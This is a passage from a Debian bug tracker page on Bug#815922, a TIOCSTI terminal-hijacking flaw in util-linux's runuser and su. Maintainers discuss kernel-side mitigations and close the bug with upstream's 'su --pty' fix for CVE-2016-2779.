DEN_TTY%20on%20Feb%2018%20%20%0A%3E%20that%20disallows%20the%20use%20of%20TIOCSTI%20to%20unprivileged%20users%2C%20unless%20they%20%20%0A%3E%20have%20the%20CAP_SYS_ADMIN%20capability%2C%20mitigating%20these%20issues.%0A%3E%20%0A%3E%20He%20said%20looking%20into%20it%2C%20he%20didn%27t%20find%20any%20legitimate%20uses%20of%20such%20ioctl.%0A%3E%20%0A%3E%20Check%20out%20gr_handle_tiocsti%28%29%0A%3E%20%0A%3E%20----------------------------------------------------------------%0A%3E%20This%20message%20was%20sent%20using%20IMP%2C%20the%20Internet%20Messaging%20Program.%0A%3E%20%0A%3E%20%0A%3E%20%0A%3E%20%0A&amp;References=%3C20160225195123.16045jftg2ztsn40%40webmail.alunos.dcc.fc.up.pt%3E%0A%09%3C56D06991.9040609%40ubuntu.com%3E%0A%09%3C20160227102337.109716vu4j3dq69w%40webmail.alunos.dcc.fc.up.pt%3E%0A%09%3C56D459E8.9000307%40ubuntu.com%3E%0A%20%3C20160229192950.19073lpxipzw8vms%40webmail.alunos.dcc.fc.up.pt%3E&amp;subject=Re%3A%20Bug%23815922%3A%20runuser%20tty%20hijacking%20via%20TIOCSTI%20ioctl">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=up201407890%40alunos.dcc.fc.up.pt" alt="">
<div class="header"><span class="headerfield">From:</span> up201407890@alunos.dcc.fc.up.pt</div>
<div class="header"><span class="headerfield">To:</span> &quot;Phil Susi&quot; &lt;psusi@ubuntu.com&gt;</div>
<div class="header"><span class="headerfield">Cc:</span> 815922@bugs.debian.org</div>
<div class="header"><span class="headerfield">Subject:</span> Re: Bug#815922: runuser tty hijacking via TIOCSTI ioctl</div>
<div class="header"><span class="headerfield">Date:</span> Mon, 29 Feb 2016 19:29:50 +0100</div>
</div>
<pre class="message flowed">Quoting &quot;Phil Susi&quot; &lt;psusi@ubuntu.com&gt;:

&gt; On 2/27/2016 4:23 AM, up201407890@alunos.dcc.fc.up.pt wrote:
&gt;&gt; And yes, there would be no job control if you started a shell from
&gt;&gt; there. This is why in &quot;su&quot; setsid() is called only with &quot;-c&quot;, partially
&gt;&gt; fixing the issue. If one would to &quot;su - user&quot; it would still be vulnerable.
&gt;
&gt; That isn&#39;t good.  Shouldn&#39;t only the foreground process group be allowed
&gt; to use this ioctl, thus preventing any background forked processes from
&gt; exploiting this?

I believe that is up to kernel developers.
grsecurity released a new feature named GRKERNSEC_HARDEN_TTY on Feb 18  
that disallows the use of TIOCSTI to unprivileged users, unless they  
have the CAP_SYS_ADMIN capability, mitigating these issues.

He said looking into it, he didn&#39;t find any legitimate uses of such ioctl.

Check out gr_handle_tiocsti()

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.




</pre>

<div class="infmessage"><hr><p>
<a name="36"></a>
<!-- request_addr: debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt; -->
<!-- time:1456839371 -->
<strong>Information forwarded</strong>
to <code>debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt;</code>:<br>
<code>Bug#815922</code>; Package <code>util-linux</code>.
 (Tue, 01 Mar 2016 13:36:11 GMT) (<a href="bugreport.cgi?bug=815922;msg=37">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=37">mbox</a>, <a href="#36">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="38"></a>
<!-- request_addr: Phil Susi &lt;psusi@ubuntu.com&gt; -->
<!-- time:1456839371 -->
<strong>Acknowledgement sent</strong>
to <code>Phil Susi &lt;psusi@ubuntu.com&gt;</code>:<br>
Extra info received and forwarded to list.  Copy sent to <code>Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt;</code>.
 (Tue, 01 Mar 2016 13:36:11 GMT) (<a href="bugreport.cgi?bug=815922;msg=39">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=39">mbox</a>, <a href="#38">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="40"></a><a name="msg40"></a><a href="#40">Message #40</a> received at 815922@bugs.debian.org (<a href="bugreport.cgi?bug=815922;msg=40">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=40">mbox</a>, <a href="mailto:815922@bugs.debian.org?In-Reply-To=%3C56D59A8B.60003%40ubuntu.com%3E&amp;References=%3C20160225195123.16045jftg2ztsn40%40webmail.alunos.dcc.fc.up.pt%3E%0A%20%3C56D06991.9040609%40ubuntu.com%3E%0A%20%3C20160227102337.109716vu4j3dq69w%40webmail.alunos.dcc.fc.up.pt%3E%0A%20%3C56D459E8.9000307%40ubuntu.com%3E%0A%20%3C20160229192950.19073lpxipzw8vms%40webmail.alunos.dcc.fc.up.pt%3E%0A%20%3C56D59A8B.60003%40ubuntu.com%3E&amp;body=On%20Tue%2C%201%20Mar%202016%2008%3A35%3A07%20-0500%20Phil%20Susi%20%3Cpsusi%40ubuntu.com%3E%20wrote%3A%0A%3E%20On%202%2F29%2F2016%201%3A29%20PM%2C%20up201407890%40alunos.dcc.fc.up.pt%20wrote%3A%0A%3E%20%3E%20He%20said%20looking%20into%20it%2C%20he%20didn%27t%20find%20any%20legitimate%20uses%20of%20such%20ioctl.%0A%3E%20%0A%3E%20That%20was%20the%20other%20thing%20I%20was%20wondering%20about%3A%20why%20would%20such%20a%20silly%0A%3E%20and%20security%20problematic%20ioctl%20exist%20in%20the%20first%20place%3F%20%20I%20guess%20that%0A%3E%20answers%20it%2C%20and%20removing%20or%20restricting%20it%20means%20we%20don%27t%20break%20job%0A%3E%20control.%20%20That%20sounds%20like%20the%20proper%20fix%20instead%20of%20using%20setsid%28%29.%0A%3E%20%0A%3E%20%0A%3E%20%0A&amp;subject=Re%3A%20Bug%23815922%3A%20runuser%20tty%20hijacking%20via%20TIOCSTI%20ioctl">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=psusi%40ubuntu.com" alt="">
<div class="header"><span class="headerfield">From:</span> Phil Susi &lt;psusi@ubuntu.com&gt;</div>
<div class="header"><span class="headerfield">To:</span> up201407890@alunos.dcc.fc.up.pt</div>
<div class="header"><span class="headerfield">Cc:</span> 815922@bugs.debian.org</div>
<div class="header"><span class="headerfield">Subject:</span> Re: Bug#815922: runuser tty hijacking via TIOCSTI ioctl</div>
<div class="header"><span class="headerfield">Date:</span> Tue, 1 Mar 2016 08:35:07 -0500</div>
</div>
<pre class="message">On 2/29/2016 1:29 PM, up201407890@alunos.dcc.fc.up.pt wrote:
&gt; He said looking into it, he didn&#39;t find any legitimate uses of such ioctl.

That was the other thing I was wondering about: why would such a silly
and security problematic ioctl exist in the first place?  I guess that
answers it, and removing or restricting it means we don&#39;t break job
control.  That sounds like the proper fix instead of using setsid().



</pre>

<div class="infmessage"><hr><p>
<a name="41"></a>
<!-- request_addr: debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt; -->
<!-- time:1457014683 -->
<strong>Information forwarded</strong>
to <code>debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt;</code>:<br>
<code>Bug#815922</code>; Package <code>util-linux</code>.
 (Thu, 03 Mar 2016 14:18:03 GMT) (<a href="bugreport.cgi?bug=815922;msg=42">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=42">mbox</a>, <a href="#41">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="43"></a>
<!-- request_addr: Stanislav Brabec &lt;sbrabec@suse.cz&gt; -->
<!-- time:1457014683 -->
<strong>Acknowledgement sent</strong>
to <code>Stanislav Brabec &lt;sbrabec@suse.cz&gt;</code>:<br>
Extra info received and forwarded to list.  Copy sent to <code>Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt;</code>.
 (Thu, 03 Mar 2016 14:18:03 GMT) (<a href="bugreport.cgi?bug=815922;msg=44">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=44">mbox</a>, <a href="#43">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="45"></a><a name="msg45"></a><a href="#45">Message #45</a> received at 815922@bugs.debian.org (<a href="bugreport.cgi?bug=815922;msg=45">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=45">mbox</a>, <a href="mailto:815922@bugs.debian.org?subject=Re%3A%20runuser%20tty%20hijacking%20via%20TIOCSTI%20ioctl&amp;body=On%20Thu%2C%203%20Mar%202016%2014%3A58%3A49%20%2B0100%20Stanislav%20Brabec%20%3Csbrabec%40suse.cz%3E%20wrote%3A%0A%3E%20I%20just%20opened%20a%20discussion%20on%20the%20upstream%20util-linux%20list%3A%0A%3E%20http%3A%2F%2Fmarc.info%2F%3Ft%3D145694748900001%26r%3D1%26w%3D2%0A%3E%20%0A%3E%20Discussion%20there%20proposes%20to%20fix%20it%20in%20the%20kernel%3A%0A%3E%20%0A%3E%20Disallow%20the%20use%20of%20TIOCSTI%20to%20unprivileged%20users%20unless%20the%20caller%20has%20%0A%3E%20CAP_SYS_ADMIN.%0A%3E%20%0A%3E%20--%20%0A%3E%20Best%20Regards%20%2F%20S%20pozdravem%2C%0A%3E%20%0A%3E%20Stanislav%20Brabec%0A%3E%20software%20developer%0A%3E%20---------------------------------------------------------------------%0A%3E%20SUSE%20LINUX%2C%20s.%20r.%20o.%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20e-mail%3A%20sbrabec%40suse.com%0A%3E%20Lihovarsk%C3%A1%201060%2F12%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20tel%3A%20%2B49%20911%207405384547%0A%3E%20190%2000%20Praha%209%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20fax%3A%20%20%2B420%20284%20084%20001%0A%3E%20Czech%20Republic%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20http%3A%2F%2Fwww.suse.cz%2F%0A%3E%20PGP%3A%20830B%2040D5%209E05%2035D8%205E27%206FA3%20717C%20209F%20A04F%20CD76%0A%3E%20%0A%3E%20%0A&amp;References=%3C20160225195123.16045jftg2ztsn40%40webmail.alunos.dcc.fc.up.pt%3E%0A%20%3C20160225195123.16045jftg2ztsn40%40webmail.alunos.dcc.fc.up.pt%3E%0A%20%3C56D84319.7060502%40suse.cz%3E&amp;In-Reply-To=%3C56D84319.7060502%40suse.cz%3E">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=sbrabec%40suse.cz" alt="">
<div class="header"><span class="headerfield">From:</span> Stanislav Brabec &lt;sbrabec@suse.cz&gt;</div>
<div class="header"><span class="headerfield">To:</span> 815922@bugs.debian.org</div>
<div class="header"><span class="headerfield">Subject:</span> Re: runuser tty hijacking via TIOCSTI ioctl</div>
<div class="header"><span class="headerfield">Date:</span> Thu, 3 Mar 2016 14:58:49 +0100</div>
</div>
<pre class="message flowed">I just opened a discussion on the upstream util-linux list:
<a href="http://marc.info/?t=145694748900001&amp;r=1&amp;w=2">http://marc.info/?t=145694748900001&amp;r=1&amp;w=2</a>

Discussion there proposes to fix it in the kernel:

Disallow the use of TIOCSTI to unprivileged users unless the caller has 
CAP_SYS_ADMIN.

-- 
Best Regards / S pozdravem,

Stanislav Brabec
software developer
---------------------------------------------------------------------
SUSE LINUX, s. r. o.                         e-mail: sbrabec@suse.com
Lihovarská 1060/12                            tel: +49 911 7405384547
190 00 Praha 9                                 fax:  +420 284 084 001
Czech Republic                                    <a href="http://www.suse.cz/">http://www.suse.cz/</a>
PGP: 830B 40D5 9E05 35D8 5E27 6FA3 717C 209F A04F CD76


</pre>

<div class="msgreceived"><hr><p>
<a name="46"></a>
<!-- request_addr: Chris Hofstaedtler &lt;zeha@debian.org&gt; -->
<!-- time:1533754266 -->
<strong>Reply sent</strong>
to <code>Chris Hofstaedtler &lt;zeha@debian.org&gt;</code>:<br>
You have taken responsibility.
 (Wed, 08 Aug 2018 18:51:06 GMT) (<a href="bugreport.cgi?bug=815922;msg=47">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=47">mbox</a>, <a href="#46">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="48"></a>
<!-- request_addr: up201407890@alunos.dcc.fc.up.pt -->
<!-- time:1533754266 -->
<strong>Notification sent</strong>
to <code>up201407890@alunos.dcc.fc.up.pt</code>:<br>
Bug acknowledged by developer.
 (Wed, 08 Aug 2018 18:51:06 GMT) (<a href="bugreport.cgi?bug=815922;msg=49">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=49">mbox</a>, <a href="#48">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="50"></a><a name="msg50"></a><a href="#50">Message #50</a> received at 815922-done@bugs.debian.org (<a href="bugreport.cgi?bug=815922;msg=50">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=50">mbox</a>, <a href="mailto:815922@bugs.debian.org?In-Reply-To=%3C20180808184647.t6b2vbbtshh6ye2a%40percival.namespace.at%3E&amp;body=On%20Wed%2C%208%20Aug%202018%2020%3A46%3A48%20%2B0200%20Chris%20Hofstaedtler%20%3Czeha%40debian.org%3E%20wrote%3A%0A%3E%20Version%3A%202.31.1-0.1%0A%3E%20%0A%3E%20Upstream%20had%20this%20to%20say%20for%20the%202.31.0%20release%3A%0A%3E%20%0A%3E%20%20CVE-2016-2779%20%0A%3E%20%0A%3E%20%20The%20new%20experimental%20%22su%20--pty%22%20feature%20has%20been%20implemented%20to%20fix%20this%20issue.%0A%3E%20%20The%20feature%20is%20not%20enabled%20by%20default%20and%20the%20new%20command%20line%20option%20--pty%20is%0A%3E%20%20necessary.%0A%3E%20%0A%3E%20%20The%20classic%20way%20is%20to%20use%20setsid%28%29%20to%20disable%20the%20ioctl%20TIOCSTI.%20Unfortunately%2C%0A%3E%20%20setsid%28%29%20has%20well-defined%20use%20cases%20in%20su%281%29%20and%20runuser%281%29%20and%20any%20changes%20%0A%3E%20%20would%20introduce%20regressions.%20The%20setsid%28%29%20also%20does%20not%20fix%20core%20of%20the%20problem%20%0A%3E%20%20that%20is%20terminal%20file%20descriptors%20shared%20between%20privileged%20and%20unprivileged%0A%3E%20%20sessions.%0A%3E%20%0A%3E%20%0A%3E%20Note%3A%0A%3E%20%0A%3E%20%20runuser%20uses%20the%20su-common%20code%2C%20and%20also%20got%20the%20--pty%20flag.%0A%3E%20%0A%3E%20%0A%3E%20%0A&amp;References=%3C20160225195123.16045jftg2ztsn40%40webmail.alunos.dcc.fc.up.pt%3E%0A%20%3C20180808184647.t6b2vbbtshh6ye2a%40percival.namespace.at%3E&amp;subject=Re%3A%20Bug%23815922%3A%20runuser%20tty%20hijacking%20via%20TIOCSTI%20ioctl">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=zeha%40debian.org" alt="">
<div class="header"><span class="headerfield">From:</span> Chris Hofstaedtler &lt;zeha@debian.org&gt;</div>
<div class="header"><span class="headerfield">To:</span> up201407890@alunos.dcc.fc.up.pt, 815922-done@bugs.debian.org</div>
<div class="header"><span class="headerfield">Subject:</span> Re: Bug#815922: runuser tty hijacking via TIOCSTI ioctl</div>
<div class="header"><span class="headerfield">Date:</span> Wed, 8 Aug 2018 20:46:48 +0200</div>
</div>
<pre class="message">Version: 2.31.1-0.1

Upstream had this to say for the 2.31.0 release:

 <a href="https://security-tracker.debian.org/tracker/CVE-2016-2779">CVE-2016-2779</a> 

 The new experimental &quot;su --pty&quot; feature has been implemented to fix this issue.
 The feature is not enabled by default and the new command line option --pty is
 necessary.

 The classic way is to use setsid() to disable the ioctl TIOCSTI. Unfortunately,
 setsid() has well-defined use cases in su(1) and runuser(1) and any changes 
 would introduce regressions. The setsid() also does not fix core of the problem 
 that is terminal file descriptors shared between privileged and unprivileged
 sessions.


Note:

 runuser uses the su-common code, and also got the --pty flag.



</pre>

<div class="msgreceived"><hr><p>
<a name="51"></a>
<!-- command:archive -->
<!-- requester: Debbugs Internal Request &lt;owner@bugs.debian.org&gt; -->
<!-- request_addr: internal_control@bugs.debian.org -->
<!-- time:1536218760 -->
<!-- new_data:
$new_data = {};
-->
<!-- old_data:
$old_data = {};
-->
<strong>Bug archived.</strong>
Request was from <code>Debbugs Internal Request &lt;owner@bugs.debian.org&gt;</code>
to <code>internal_control@bugs.debian.org</code>.
 (Thu, 06 Sep 2018 07:26:00 GMT) (<a href="bugreport.cgi?bug=815922;msg=52">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=52">mbox</a>, <a href="#51">link</a>).</p></p></div>

<hr>
<p class="msgreceived">Send a report that <a href="https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=815922">this bug log contains spam</a>.</p>
<hr>
<ADDRESS>Debian bug tracking system administrator &lt;<A HREF="mailto:owner@bugs.debian.org">owner@bugs.debian.org</A>&gt;.
Last modified:
<!--timestamp-->Sat Oct 30 18:32:16 2021<!--end timestamp-->; 
Machine Name:
<!--machinename-->buxtehude<!--machinename-->
<P>
<A HREF="https://www.debian.org/Bugs/">Debian Bug tracking system</A>
</p>
<p>
  Debbugs is free software and licensed under the terms of the GNU
  Public License version 2. The current version can be obtained
  from <a href="https://bugs.debian.org/debbugs-source/">https://bugs.debian.org/debbugs-source/</a>.
</p>
<p>
Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.
</p>
</ADDRESS>

</body>
</html>
